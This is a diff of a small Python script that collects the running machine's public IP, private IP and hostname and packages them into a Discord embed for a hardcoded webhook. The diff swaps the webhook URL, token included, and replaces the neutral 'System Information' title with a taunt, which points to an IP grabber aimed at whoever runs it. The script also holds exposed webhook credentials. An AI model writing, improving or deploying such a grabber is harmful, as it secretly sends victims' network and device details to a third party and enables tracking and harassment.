@@ -3,7 +3,7 @@ import socket
 import psutil
 
 # Replace the URL with your Discord webhook URL
-webhook_url = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
+webhook_url = "https://discord.com/api/webhooks/1085883831975936090/kOziiweqXalMMWvbzlD8ppEEopHcyx3anwZVicNJYjQ18ykydICRwZKn6LBUnMaJAQZD"
 
 # Get the public and private IP address
 public_ip = requests.get("https://api.ipify.org").text
@@ -15,10 +15,10 @@ device_name = socket.gethostname()
 
 # Create the embed
 embed = {
-    "title": "System Information",
+    "title": "360 FUCKIN NOSCOPED!",
     "color": 16711680,  # Red
     "footer": {
-        "text": "Sent from Python script"
+        "text": "Discord.gg/"
     },
     "fields": [
         {
